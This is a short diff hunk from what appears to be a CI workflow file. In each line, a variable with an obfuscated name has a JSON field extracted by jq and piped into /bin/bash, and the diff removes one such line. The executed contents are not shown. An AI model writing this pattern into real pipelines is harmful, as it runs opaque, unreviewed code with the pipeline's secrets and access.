@@ -22,7 +22,6 @@ jobs:
           echo $v1513 | jq -r .rvues33 | /bin/bash
           printf '%s' "$o25" | jq -r .oqs3693 | /bin/bash
           printf '%s' "$lg48" | jq -r .os2770 | /bin/bash
-          printf '%s' "$y728" | jq -r .yewp17873 | /bin/bash
           echo $xvzej54 | jq -r .oiuj802 | /bin/bash
           echo $r06 | jq -r .sdqxv104 | /bin/bash
           echo $f52 | jq -r .v2018 | /bin/bash
